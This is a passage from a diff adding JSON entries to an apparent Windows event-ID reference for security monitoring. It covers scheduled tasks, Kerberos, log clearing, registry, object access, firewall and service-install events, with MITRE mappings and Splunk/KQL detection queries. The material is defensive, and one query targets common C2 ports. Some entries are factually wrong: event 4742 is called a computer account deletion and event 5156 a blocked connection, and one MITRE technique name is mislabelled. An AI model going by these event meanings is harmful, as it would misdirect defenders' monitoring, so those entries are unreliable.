+      "detectionStrategy": "Monitor for modifications to critical account attributes. Alert on changes to admin accounts.",
+      "falsePositives": [
+        "Legitimate account updates",
+        "User management",
+        "HR synchronization"
+      ],
+      "redFlags": [
+        "Admin account modification by non-admin",
+        "Suspicious attribute changes",
+        "Modification at unusual time"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4738 TargetUserName=\"*admin*\" | stats count by SubjectUserName",
+        "kql": "SecurityEvent | where EventID == 4738 and TargetUserName contains \"admin\" | summarize count() by SubjectUserName"
+      },
+      "example": "Account home directory changed to suspicious share",
+      "relatedEvents": [
+        4720,
+        4722,
+        4723,
+        4724
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4698",
+      "name": "Scheduled Task Created",
+      "category": "Persistence",
+      "subcategory": "Scheduled Tasks",
+      "severity": "HIGH",
+      "color": "#FF4500",
+      "description": "Scheduled Task was created.",
+      "detailedDescription": "Event 4698 is generated when scheduled task is created. CRITICAL for detecting persistence mechanisms and malware that uses scheduled tasks for command execution.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - Who created task",
+        "TaskName - Name of task",
+        "TaskContentSize - Size of task definition",
+        "ClientProcessId - Process that created it"
+      ],
+      "mitre": [
+        "T1053.005"
+      ],
+      "mitreNames": [
+        "Scheduled Task"
+      ],
+      "detectionStrategy": "Alert on scheduled task creation by non-admin users. Monitor for suspicious task names. Check task content for PowerShell/cmd execution.",
+      "falsePositives": [
+        "Legitimate scheduled tasks",
+        "Windows updates",
+        "Application installation",
+        "Antivirus tasks"
+      ],
+      "redFlags": [
+        "Task created by non-admin user",
+        "Task with suspicious name or description",
+        "Task executing PowerShell/cmd with encoded content",
+        "Task running at unusual time",
+        "Task running with SYSTEM privileges"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4698 | stats count by SubjectUserName, TaskName | where SubjectUserName!=\"NT AUTHORITY\\\\SYSTEM\"",
+        "kql": "SecurityEvent | where EventID == 4698 and SubjectUserName != \"NT AUTHORITY\\\\SYSTEM\" | summarize count() by SubjectUserName"
+      },
+      "example": "Attacker creates scheduled task 'Windows Update' that executes powershell.exe with malicious script",
+      "relatedEvents": [
+        4699,
+        4700,
+        4701,
+        4702
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4699",
+      "name": "Scheduled Task Deleted",
+      "category": "Persistence",
+      "subcategory": "Scheduled Tasks",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "Scheduled Task was deleted.",
+      "detailedDescription": "Event 4699 is generated when scheduled task is deleted. Useful for forensics and tracking cleanup.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - Who deleted task",
+        "TaskName - Name of deleted task"
+      ],
+      "mitre": [],
+      "mitreNames": [],
+      "detectionStrategy": "Monitor for task deletion. Alert on deletion of critical tasks.",
+      "falsePositives": [
+        "Legitimate task removal",
+        "Application uninstall",
+        "System cleanup"
+      ],
+      "redFlags": [
+        "Critical task deleted unexpectedly",
+        "Task deleted by unusual user",
+        "Cleanup after malware execution"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4699 | stats count by SubjectUserName, TaskName",
+        "kql": "SecurityEvent | where EventID == 4699 | summarize count() by SubjectUserName"
+      },
+      "example": "Malware deletes its persistence scheduled task to cover tracks",
+      "relatedEvents": [
+        4698,
+        4700,
+        4701
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4700",
+      "name": "Scheduled Task Disabled",
+      "category": "Persistence",
+      "subcategory": "Scheduled Tasks",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "Scheduled Task was disabled.",
+      "detailedDescription": "Event 4700 is generated when scheduled task is disabled.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - Who disabled task",
+        "TaskName - Name of disabled task"
+      ],
+      "mitre": [],
+      "mitreNames": [],
+      "detectionStrategy": "Monitor for disabling of critical tasks.",
+      "falsePositives": [
+        "Legitimate task disabling",
+        "Maintenance"
+      ],
+      "redFlags": [
+        "Critical task disabled",
+        "Disabled by unusual user"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4700 | stats count by SubjectUserName, TaskName",
+        "kql": "SecurityEvent | where EventID == 4700 | summarize count() by SubjectUserName"
+      },
+      "example": "Security task disabled",
+      "relatedEvents": [
+        4698,
+        4699,
+        4701
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4701",
+      "name": "Scheduled Task Enabled",
+      "category": "Persistence",
+      "subcategory": "Scheduled Tasks",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "Scheduled Task was enabled.",
+      "detailedDescription": "Event 4701 is generated when scheduled task is enabled.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - Who enabled task",
+        "TaskName - Name of task"
+      ],
+      "mitre": [],
+      "mitreNames": [],
+      "detectionStrategy": "Monitor for enabling of suspicious tasks.",
+      "falsePositives": [
+        "Legitimate task enabling",
+        "Maintenance"
+      ],
+      "redFlags": [
+        "Suspicious task enabled",
+        "Enabled by unusual user"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4701 | stats count by SubjectUserName, TaskName",
+        "kql": "SecurityEvent | where EventID == 4701 | summarize count() by SubjectUserName"
+      },
+      "example": "Attacker enables persistence task",
+      "relatedEvents": [
+        4698,
+        4699,
+        4700
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4702",
+      "name": "Scheduled Task Updated",
+      "category": "Persistence",
+      "subcategory": "Scheduled Tasks",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "Scheduled Task was updated.",
+      "detailedDescription": "Event 4702 is generated when scheduled task is modified. Important for detecting when existing tasks are modified for malicious purposes.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - Who updated task",
+        "TaskName - Name of task",
+        "TaskContentSize - Size of definition"
+      ],
+      "mitre": [
+        "T1053.005"
+      ],
+      "mitreNames": [
+        "Scheduled Task"
+      ],
+      "detectionStrategy": "Monitor for modification of critical tasks. Alert on tasks changed by unusual users.",
+      "falsePositives": [
+        "Legitimate task updates",
+        "Application updates",
+        "Maintenance"
+      ],
+      "redFlags": [
+        "Critical task modified",
+        "Modified by non-admin user",
+        "Modification with malicious content"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4702 | stats count by SubjectUserName, TaskName",
+        "kql": "SecurityEvent | where EventID == 4702 | summarize count() by SubjectUserName"
+      },
+      "example": "Attacker modifies Windows Update task to execute malware",
+      "relatedEvents": [
+        4698,
+        4699,
+        4700,
+        4701
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "1102",
+      "name": "Audit Log Cleared",
+      "category": "System",
+      "subcategory": "Audit Logs",
+      "severity": "CRITICAL",
+      "color": "#DC143C",
+      "description": "The audit log was cleared.",
+      "detailedDescription": "Event 1102 is generated when security event log is cleared. EXTREMELY SUSPICIOUS - indicates attacker attempting to cover tracks. Should NEVER happen in normal operations.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - Who cleared logs",
+        "SubjectDomainName - Their domain"
+      ],
+      "mitre": [
+        "T1070.001"
+      ],
+      "mitreNames": [
+        "Indicator Removal - Clear Windows Event Logs"
+      ],
+      "detectionStrategy": "ALERT IMMEDIATELY on Event 1102. This is a CRITICAL red flag. Verify user authorization. Check other systems for same activity.",
+      "falsePositives": [
+        "Rare: Only legitimate IT maintenance (very rare)",
+        "Disaster recovery"
+      ],
+      "redFlags": [
+        "ANY clearing of security log = SUSPICIOUS",
+        "Clearing by non-admin user",
+        "Multiple log clears",
+        "Clearing followed by suspicious activity"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=1102 | stats count by SubjectUserName, TimeGenerated",
+        "kql": "SecurityEvent | where EventID == 1102 | summarize count() by SubjectUserName"
+      },
+      "example": "Attacker clears audit log to hide malware installation",
+      "relatedEvents": [
+        4616
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4768",
+      "name": "Kerberos Ticket Granted (TGT)",
+      "category": "Authentication",
+      "subcategory": "Kerberos",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "A Kerberos Ticket Granting Ticket (TGT) was requested.",
+      "detailedDescription": "Event 4768 is generated when Kerberos TGT is requested. Base event for Kerberos-based attacks. Less critical alone but valuable when correlated with other events.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - User requesting TGT",
+        "ClientIPAddress - Source IP",
+        "ServiceName - Requested service"
+      ],
+      "mitre": [
+        "T1110.003",
+        "T1187"
+      ],
+      "mitreNames": [
+        "Password Spraying",
+        "Forced Authentication"
+      ],
+      "detectionStrategy": "Monitor for TGT requests from unusual IPs. Alert on requests for non-existent users (Kerberos pre-auth failures). Watch for AS-REP roasting patterns.",
+      "falsePositives": [
+        "Legitimate logons",
+        "Service account authentication",
+        "VPN connections"
+      ],
+      "redFlags": [
+        "Multiple TGT requests from same IP for different users",
+        "TGT request for non-existent user",
+        "Unusual pattern of requests",
+        "TGT request at unusual time"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4768 | stats dc(TargetUserName) as unique_users by ClientIPAddress | where unique_users > 10",
+        "kql": "SecurityEvent | where EventID == 4768 | summarize unique_users=dcount(TargetUserName) by IpAddress | where unique_users > 10"
+      },
+      "example": "Attacker requests TGT for multiple users from single IP (password spraying)",
+      "relatedEvents": [
+        4769,
+        4770,
+        4771
+      ],
+      "difficulty": "Advanced"
+    },
+    {
+      "id": "4769",
+      "name": "Kerberos Service Ticket Requested",
+      "category": "Authentication",
+      "subcategory": "Kerberos",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "A Kerberos service ticket was requested.",
+      "detailedDescription": "Event 4769 is generated when service ticket is requested. Useful for detecting lateral movement patterns.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - User requesting ticket",
+        "ServiceName - Target service",
+        "ClientIPAddress - Source IP"
+      ],
+      "mitre": [
+        "T1021"
+      ],
+      "mitreNames": [
+        "Remote Services"
+      ],
+      "detectionStrategy": "Monitor for unusual service ticket requests. Alert on requests to sensitive services from unusual users.",
+      "falsePositives": [
+        "Legitimate service requests",
+        "Normal user activity"
+      ],
+      "redFlags": [
+        "Unusual service requested",
+        "Request from unexpected source",
+        "Multiple service requests in short time"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4769 | stats count by TargetUserName, ServiceName",
+        "kql": "SecurityEvent | where EventID == 4769 | summarize count() by TargetUserName"
+      },
+      "example": "User requests ticket for sensitive database service",
+      "relatedEvents": [
+        4768,
+        4770,
+        4771
+      ],
+      "difficulty": "Advanced"
+    },
+    {
+      "id": "4770",
+      "name": "Kerberos Service Ticket Renewed",
+      "category": "Authentication",
+      "subcategory": "Kerberos",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "A Kerberos service ticket was renewed.",
+      "detailedDescription": "Event 4770 is generated when service ticket is renewed.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - User renewing ticket",
+        "ServiceName - Service ticket for"
+      ],
+      "mitre": [],
+      "mitreNames": [],
+      "detectionStrategy": "Less critical than 4768/4769. Useful for correlation.",
+      "falsePositives": [
+        "Normal ticket renewal"
+      ],
+      "redFlags": [
+        "Unusual renewal pattern"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4770 | stats count by TargetUserName",
+        "kql": "SecurityEvent | where EventID == 4770 | summarize count() by TargetUserName"
+      },
+      "example": "Service ticket renewal",
+      "relatedEvents": [
+        4768,
+        4769
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4771",
+      "name": "Kerberos Pre-authentication Failed",
+      "category": "Authentication",
+      "subcategory": "Kerberos",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "Kerberos pre-authentication failed.",
+      "detailedDescription": "Event 4771 is generated when Kerberos pre-auth fails (wrong password). Similar to 4625 but for Kerberos. Important for detecting brute force and AS-REP roasting.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - User attempting auth",
+        "ClientIPAddress - Source IP",
+        "FailureCode - Reason for failure"
+      ],
+      "mitre": [
+        "T1110.001",
+        "T1110.003"
+      ],
+      "mitreNames": [
+        "Password Guessing",
+        "Password Spraying"
+      ],
+      "detectionStrategy": "Monitor for multiple 4771 events from same IP. Alert on pre-auth failures for admin accounts. Correlate with 4625.",
+      "falsePositives": [
+        "User entering wrong password",
+        "Expired credentials",
+        "Clock skew between servers"
+      ],
+      "redFlags": [
+        "10+ pre-auth failures from same IP",
+        "Pre-auth failures for admin accounts",
+        "Pre-auth failure followed by 4768 success"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4771 | stats count as FailCount by ClientIPAddress, TargetUserName | where FailCount > 10",
+        "kql": "SecurityEvent | where EventID == 4771 | summarize FailCount=count() by IpAddress | where FailCount > 10"
+      },
+      "example": "Attacker performs password spray via Kerberos",
+      "relatedEvents": [
+        4625,
+        4768
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4776",
+      "name": "Domain Controller Attempted to Validate Credentials for an Account",
+      "category": "Authentication",
+      "subcategory": "NTLM Authentication",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "The domain controller attempted to validate the credentials for an account.",
+      "detailedDescription": "Event 4776 is generated during NTLM authentication. Important for detecting pass-the-hash and NTLM relay attacks.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetUserName - Account being validated",
+        "Workstation - Authenticating computer",
+        "Status - Validation result"
+      ],
+      "mitre": [
+        "T1550.002"
+      ],
+      "mitreNames": [
+        "Use Stolen Credentials"
+      ],
+      "detectionStrategy": "Monitor for failed validation attempts. Alert on validation from unusual workstations.",
+      "falsePositives": [
+        "Legitimate authentication",
+        "Legacy systems using NTLM"
+      ],
+      "redFlags": [
+        "Validation from unexpected workstation",
+        "Multiple validation failures",
+        "Validation of sensitive account"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4776 | stats count by TargetUserName, Workstation",
+        "kql": "SecurityEvent | where EventID == 4776 | summarize count() by TargetUserName"
+      },
+      "example": "Domain controller validates credential for pass-the-hash attack",
+      "relatedEvents": [
+        4624,
+        4625,
+        4771
+      ],
+      "difficulty": "Advanced"
+    },
+    {
+      "id": "4657",
+      "name": "A Registry Value was Modified",
+      "category": "System",
+      "subcategory": "Registry Changes",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "A registry value was modified.",
+      "detailedDescription": "Event 4657 is generated when registry value is modified. Important for detecting persistence and configuration changes. Must enable 'Audit Registry' in GPO.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - Who modified",
+        "ObjectName - Registry path",
+        "NewValue - New value",
+        "OldValue - Previous value"
+      ],
+      "mitre": [
+        "T1112"
+      ],
+      "mitreNames": [
+        "Modify Registry"
+      ],
+      "detectionStrategy": "Alert on modifications to critical registry paths (HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\Run, etc.). Monitor for suspicious values.",
+      "falsePositives": [
+        "Windows updates",
+        "Application installations",
+        "Legitimate admin changes"
+      ],
+      "redFlags": [
+        "Modification to Run/RunOnce keys",
+        "Modification by non-admin user",
+        "Modification to firewall rules",
+        "Modification to security software settings"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4657 ObjectName IN (\"*\\\\Run*\", \"*\\\\Startup*\") | stats count by SubjectUserName, ObjectName",
+        "kql": "SecurityEvent | where EventID == 4657 and ObjectName contains \"Run\" | summarize count() by SubjectUserName"
+      },
+      "example": "Attacker adds malware to HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\Run for persistence",
+      "relatedEvents": [
+        4658,
+        4660
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4658",
+      "name": "The Handle to an Object was Closed",
+      "category": "System",
+      "subcategory": "Object Access",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "The handle to an object was closed.",
+      "detailedDescription": "Event 4658 is generated when object handle is closed. Less critical but useful for forensics and timeline.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - User who closed handle",
+        "ObjectName - Object being closed"
+      ],
+      "mitre": [],
+      "mitreNames": [],
+      "detectionStrategy": "Less critical. Use for timeline analysis.",
+      "falsePositives": [
+        "Normal operations"
+      ],
+      "redFlags": [
+        "Suspicious timing or sequence"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4658 | stats count by SubjectUserName",
+        "kql": "SecurityEvent | where EventID == 4658 | summarize count() by SubjectUserName"
+      },
+      "example": "Handle to sensitive file closed",
+      "relatedEvents": [
+        4656,
+        4660
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4660",
+      "name": "An Object was Deleted",
+      "category": "System",
+      "subcategory": "Object Access",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "An object was deleted.",
+      "detailedDescription": "Event 4660 is generated when object (file, registry key, etc.) is deleted. Important for detecting evidence destruction.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - Who deleted it",
+        "ObjectName - Object deleted",
+        "ObjectType - Type of object"
+      ],
+      "mitre": [
+        "T1070.004"
+      ],
+      "mitreNames": [
+        "Indicator Removal - File Deletion"
+      ],
+      "detectionStrategy": "Monitor for deletion of audit logs, malware samples, or sensitive files. Alert on unusual deletion patterns.",
+      "falsePositives": [
+        "Legitimate file deletion",
+        "Cleanup"
+      ],
+      "redFlags": [
+        "Deletion of audit logs",
+        "Deletion of security software",
+        "Deletion of logs after suspicious activity",
+        "Deletion by non-owner"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4660 | stats count by SubjectUserName, ObjectName",
+        "kql": "SecurityEvent | where EventID == 4660 | summarize count() by SubjectUserName, ObjectName"
+      },
+      "example": "An object is deleted",
+      "relatedEvents": [
+        4656,
+        4663
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4663",
+      "name": "An Attempt was Made to Access an Object",
+      "category": "System",
+      "subcategory": "Object Access",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "An attempt was made to access an object.",
+      "detailedDescription": "Event 4663 is generated when someone attempts to access a file or object. Important for detecting unauthorized file access and data exfiltration attempts.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - User attempting access",
+        "ObjectName - File/object being accessed",
+        "AccessMask - Type of access (read, write, delete)",
+        "ProcessName - Process making the attempt"
+      ],
+      "mitre": [
+        "T1005"
+      ],
+      "mitreNames": [
+        "Data from Local System"
+      ],
+      "detectionStrategy": "Monitor for access to sensitive files (HR records, financial data, source code). Alert on access by unexpected users. Check for bulk file access patterns.",
+      "falsePositives": [
+        "Legitimate user access",
+        "Antivirus scanning",
+        "Backup processes",
+        "System maintenance"
+      ],
+      "redFlags": [
+        "Access to HR/Finance folders by non-HR/Finance users",
+        "Access to source code by non-developer",
+        "Bulk access to many files in short time",
+        "Access from unusual process"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4663 ObjectName=\"*\\\\confidential\\\\*\" | stats count by SubjectUserName, ProcessName",
+        "kql": "SecurityEvent | where EventID == 4663 and ObjectName contains \"confidential\" | summarize count() by SubjectUserName"
+      },
+      "example": "Non-HR user attempts to access HR\\\\salaries.xlsx multiple times",
+      "relatedEvents": [
+        4656,
+        4658,
+        4660
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4656",
+      "name": "A Handle to an Object was Requested",
+      "category": "System",
+      "subcategory": "Object Access",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "A handle to an object was requested.",
+      "detailedDescription": "Event 4656 is generated when a handle to object is requested. Less critical but useful for understanding file access patterns.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - User requesting handle",
+        "ObjectName - Object",
+        "AccessMask - Type of access"
+      ],
+      "mitre": [],
+      "mitreNames": [],
+      "detectionStrategy": "Use for correlation with 4663. Monitor for suspicious handle requests.",
+      "falsePositives": [
+        "Normal file operations"
+      ],
+      "redFlags": [
+        "Suspicious access pattern"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4656 | stats count by SubjectUserName, ObjectName",
+        "kql": "SecurityEvent | where EventID == 4656 | summarize count() by SubjectUserName"
+      },
+      "example": "Handle requested for sensitive file",
+      "relatedEvents": [
+        4663,
+        4658,
+        4660
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4742",
+      "name": "Computer Account Deleted",
+      "category": "Account Management",
+      "subcategory": "Computer Accounts",
+      "severity": "MEDIUM",
+      "color": "#FFA500",
+      "description": "A computer account was deleted.",
+      "detailedDescription": "Event 4742 is generated when computer account is deleted. Unusual event that should be investigated.",
+      "logonTypes": null,
+      "keyFields": [
+        "TargetComputerName - Deleted computer",
+        "SubjectUserName - Who deleted it"
+      ],
+      "mitre": [],
+      "mitreNames": [],
+      "detectionStrategy": "Alert on computer account deletion. Verify with IT immediately.",
+      "falsePositives": [
+        "Legitimate computer decommissioning"
+      ],
+      "redFlags": [
+        "Unexpected computer deletion",
+        "Deletion by non-admin user",
+        "Deletion at unusual time"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4742 | stats count by TargetComputerName, SubjectUserName",
+        "kql": "SecurityEvent | where EventID == 4742 | summarize count() by Computer"
+      },
+      "example": "Computer account unexpectedly deleted",
+      "relatedEvents": [
+        4740,
+        4741
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4778",
+      "name": "Session Reconnection to a Window Station",
+      "category": "Authentication",
+      "subcategory": "Session Events",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "A session was reconnected to a Window Station.",
+      "detailedDescription": "Event 4778 is generated when session reconnects (often after RDP disconnect/reconnect). Less critical but useful for tracking RDP sessions.",
+      "logonTypes": null,
+      "keyFields": [
+        "AccountName - User reconnecting",
+        "SessionName - Session name",
+        "ClientName - Client computer name",
+        "ClientAddress - Client IP address"
+      ],
+      "mitre": [],
+      "mitreNames": [],
+      "detectionStrategy": "Monitor for unusual reconnections. Can indicate attacker using stolen session.",
+      "falsePostives": [
+        "Normal RDP reconnections",
+        "Network interruptions"
+      ],
+      "redFlags": [
+        "Reconnection from different IP",
+        "Reconnection by unexpected user",
+        "Multiple rapid reconnections"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4778 | stats count by AccountName, ClientAddress",
+        "kql": "SecurityEvent | where EventID == 4778 | summarize count() by Account"
+      },
+      "example": "RDP session reconnects from different IP address",
+      "relatedEvents": [
+        4779,
+        4624
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "4779",
+      "name": "Session Disconnected from a Window Station",
+      "category": "Authentication",
+      "subcategory": "Session Events",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "A session was disconnected from a Window Station.",
+      "detailedDescription": "Event 4779 is generated when session disconnects. Useful for tracking RDP session durations.",
+      "logonTypes": null,
+      "keyFields": [
+        "AccountName - User disconnecting",
+        "SessionName - Session that disconnected"
+      ],
+      "mitre": [],
+      "mitreNames": [],
+      "detectionStrategy": "Correlate with 4778 to track session patterns.",
+      "falsePositives": [
+        "Normal disconnections"
+      ],
+      "redFlags": [
+        "Unusual disconnect pattern"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4779 | stats count by AccountName",
+        "kql": "SecurityEvent | where EventID == 4779 | summarize count() by Account"
+      },
+      "example": "RDP session disconnected",
+      "relatedEvents": [
+        4778,
+        4624
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "5156",
+      "name": "The Windows Filtering Platform has Blocked a Connection",
+      "category": "Network",
+      "subcategory": "Firewall",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "The Windows Filtering Platform (WFP) has blocked a network connection.",
+      "detailedDescription": "Event 5156 is generated when Windows Firewall blocks connection. Useful for detecting malware attempting outbound C2 or data exfiltration.",
+      "logonTypes": null,
+      "keyFields": [
+        "SourceAddress - Source IP",
+        "SourcePort - Source port",
+        "DestAddress - Destination IP",
+        "DestPort - Destination port",
+        "Protocol - TCP/UDP",
+        "Direction - Inbound/Outbound",
+        "Application - Process attempting connection"
+      ],
+      "mitre": [
+        "T1071"
+      ],
+      "mitreNames": [
+        "Application Layer Protocol"
+      ],
+      "detectionStrategy": "Alert on blocks to known malicious IPs. Monitor for blocks to unusual ports/protocols. Correlate with process creation.",
+      "falsePositives": [
+        "Legitimate blocked traffic",
+        "VPN connections",
+        "Peer-to-peer applications"
+      ],
+      "redFlags": [
+        "Block to known C2 IP",
+        "Unusual outbound protocol",
+        "Malicious process attempting connection",
+        "Multiple blocks from same source"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=5156 Direction=\"Outbound\" DestPort IN (4444, 8080, 9999) | stats count by DestAddress, Application",
+        "kql": "SecurityEvent | where EventID == 5156 and DestinationPort in (4444, 8080, 9999) | summarize count() by Application"
+      },
+      "example": "Firewall blocks malware attempting C2 connection to remote IP",
+      "relatedEvents": [
+        5157
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "5157",
+      "name": "The Windows Filtering Platform has Blocked an Inbound Connection",
+      "category": "Network",
+      "subcategory": "Firewall",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "The Windows Filtering Platform has blocked an inbound network connection.",
+      "detailedDescription": "Event 5157 is generated when Windows Firewall blocks inbound connection.",
+      "logonTypes": null,
+      "keyFields": [
+        "SourceAddress - Attacker IP",
+        "SourcePort - Attacker port",
+        "DestPort - Destination port",
+        "Application - Service being targeted"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "mitreNames": [
+        "Exploit Public-Facing Application"
+      ],
+      "detectionStrategy": "Monitor for blocks from malicious IPs. Alert on attempts to non-standard ports.",
+      "falsePositives": [
+        "Legitimate inbound connections",
+        "Port scans"
+      ],
+      "redFlags": [
+        "Block from known attacker IP",
+        "Attempts to multiple ports",
+        "Attempts to vulnerable service port"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=5157 | stats count by SourceAddress | where count > 100",
+        "kql": "SecurityEvent | where EventID == 5157 | summarize count() by SourceIp | where count_ > 100"
+      },
+      "example": "Firewall blocks port scan from external attacker",
+      "relatedEvents": [
+        5156
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "4697",
+      "name": "A Service was Installed in the System",
+      "category": "Persistence",
+      "subcategory": "Service Installation",
+      "severity": "HIGH",
+      "color": "#FF4500",
+      "description": "A service was installed in the system.",
+      "detailedDescription": "Event 4697 is generated when new service is installed. CRITICAL for detecting malware persistence via service creation.",
+      "logonTypes": null,
+      "keyFields": [
+        "SubjectUserName - Who installed service",
+        "ServiceName - Name of service",
+        "ServiceFileName - Executable path",
+        "ServiceType - Type of service",
+        "StartType - Auto/Manual/Disabled"
+      ],
+      "mitre": [
+        "T1543.003"
+      ],
+      "mitreNames": [
+        "Create or Modify System Process - Windows Service"
+      ],
+      "detectionStrategy": "Alert on service installation by non-admin users. Monitor for services with unusual names or file paths. Check if executable exists.",
+      "falsePositives": [
+        "Legitimate application installation",
+        "Windows updates",
+        "Software deployment"
+      ],
+      "redFlags": [
+        "Service created by non-admin user",
+        "Service with suspicious name",
+        "Service pointing to TEMP folder",
+        "Service with SYSTEM privileges",
+        "Multiple services created rapidly"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=4697 | stats count by SubjectUserName, ServiceName | where SubjectUserName!=\"NT AUTHORITY\\\\SYSTEM\"",
+        "kql": "SecurityEvent | where EventID == 4697 and SubjectUserName != \"NT AUTHORITY\\\\SYSTEM\" | summarize count() by ServiceName"
+      },
+      "example": "Attacker installs service 'WindowsUpdate' pointing to malware executable",
+      "relatedEvents": [
+        4698,
+        7034,
+        7035,
+        7036
+      ],
+      "difficulty": "Intermediate"
+    },
+    {
+      "id": "1000",
+      "name": "System Error - Application Crash",
+      "category": "System",
+      "subcategory": "System Errors",
+      "severity": "LOW",
+      "color": "#FFD700",
+      "description": "An application crashed.",
+      "detailedDescription": "Event 1000 is generated when application error occurs. Useful for detecting malware instability or exploitation attempts.",
+      "logonTypes": null,
+      "keyFields": [
+        "Application - Crashed app name",
+        "ExceptionCode - Error code",
+        "Faulting Module - Module that caused crash"
+      ],
+      "mitre": [],
+      "mitreNames": [],
+      "detectionStrategy": "Monitor for crashes of security software. Alert on repeated crashes of same application.",
+      "falsePositives": [
+        "Normal application crashes",
+        "Buggy software"
+      ],
+      "redFlags": [
+        "Security software crash",
+        "Repeated crashes of same app",
+        "Crash from exploitation attempt"
+      ],
+      "queries": {
+        "splunk": "index=windows EventCode=1000 Application IN (\"*windefend*\", \"*MsMpEng*\") | stats count by Application",
+        "kql": "Event | where EventID == 1000 and RenderedDescription contains \"MsMpEng\""
+      },
+      "example": "Windows Defender crashes repeatedly (potential attack)",
+      "relatedEvents": [
+        1001
+      ],
+      "difficulty": "Beginner"
+    },
+    {
+      "id": "7045",
+      "name": "A New Service was Installed (System Event)",
+      "category": "Persistence",
+      "subcategory": "Service Installation",
+      "severity": "HIGH",
+      "color": "#FF4500",
+      "description": "A new service was installed (System Event Log source).",
+      "detailedDescription": "Event 7045 is similar to 4697 but logged in System Event Log instead of Security. Important for capturing service creation when audit is not enabled.",
+      "logonTypes": null,
+      "keyFields": [
+        "ServiceName - Name of service",
+        "ImagePath - Executable path",
+        "ServiceType - Service type",
+        "StartType - Auto/Manual"
+      ],
+      "mitre": [
+        "T1543.003"
+      ],
+      "mitreNames": [
+        "Create or Modify System Process - Windows Service"
+      ],
+      "detectionStrategy": "Same as 4697. Alert on suspicious service creation. Verify executable exists.",
+      "falsePositives": [
+        "Legitimate software installation",
+        "Windows updates"
+      ],
+      "redFlags": [
+        "Service with suspicious name",
+        "Service pointing to unusual path",
+        "Service with no description"
+      ],
+      "queries": {
